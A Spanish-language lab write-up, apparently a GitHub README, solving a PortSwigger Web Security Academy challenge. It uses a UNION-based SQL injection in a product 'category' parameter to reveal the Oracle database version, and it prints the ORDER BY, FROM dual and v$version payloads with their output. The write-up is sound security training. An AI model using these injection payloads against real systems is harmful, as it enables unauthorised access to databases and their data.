# 🧪 SQL Injection - Querying Database Type and Version on Oracle

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-SQL%20Injection-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
**SQL Injection basada en UNION** para extraer la **versión de la base de datos
Oracle** desde una aplicación de e-commerce.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Identificación | `' ORDER BY N--` | Nº de columnas = 2 |
| Confirmación | `' UNION SELECT 'a','a' FROM dual--` | Columnas aceptan texto |
| Extracción | `' UNION SELECT banner, NULL FROM v$version--` | Versión de Oracle |

---

## 🎯 Objetivo

Mostrar la **versión de la base de datos Oracle** a través de una SQL Injection
en el parámetro `category` de la URL.

---

## 🔍 Análisis

### 1. Identificación del parámetro vulnerable

La URL del catálogo de productos es del tipo:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

El parámetro `category` se usa directamente en una consulta SQL sin sanitizar.

### 2. Determinar el número de columnas

Se prueba con `ORDER BY` incrementando el número hasta que la consulta falla:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← error
```

✅ La consulta devuelve **2 columnas**.

### 3. Confirmar que aceptan texto

En Oracle, toda consulta `SELECT` necesita un `FROM`. Se usa la tabla especial
`dual`:

```
' UNION SELECT 'a', 'a' FROM dual--
```

✅ Ambas columnas aceptan datos de tipo texto.

> 💡 **Nota Oracle:** a diferencia de MySQL/PostgreSQL, Oracle **requiere**
> `FROM dual` en cada `SELECT`. Si lo omites, la consulta falla.

---

## 💥 Explotación

### 4. Extraer la versión de Oracle

La vista `v$version` contiene el banner de versión de la base de datos:

```
' UNION SELECT banner, NULL FROM v$version--
```

**Resultado:**

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

---

## 📸 Evidencia

![version](https://github.com/user-attachments/assets/d60431d6-d2d4-4d37-88ac-7e76f0671f2f)

✅ **Laboratorio completado.**

---

## 🧠 Lecciones aprendidas

1. **Oracle es especial**: cada `SELECT` necesita `FROM dual`. Es la diferencia
   clave respecto a MySQL/PostgreSQL.
2. **`ORDER BY N`** es la forma más limpia de contar columnas.
3. **`UNION SELECT`** requiere que el número y tipo de columnas coincidan.
4. **`v$version`** es la vista estándar para leer la versión de Oracle.
5. **Comillas y comentarios**: `'` para cerrar el string, `--` para comentar
   el resto de la consulta original.

---

## 🛠️ Herramientas utilizadas

- Navegador web (URL manual)
- Burp Suite (Repeater) — opcional para manipular peticiones

---

## 📚 Referencias

- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger - UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [Oracle - v$version](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/V-VERSION.html)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-19
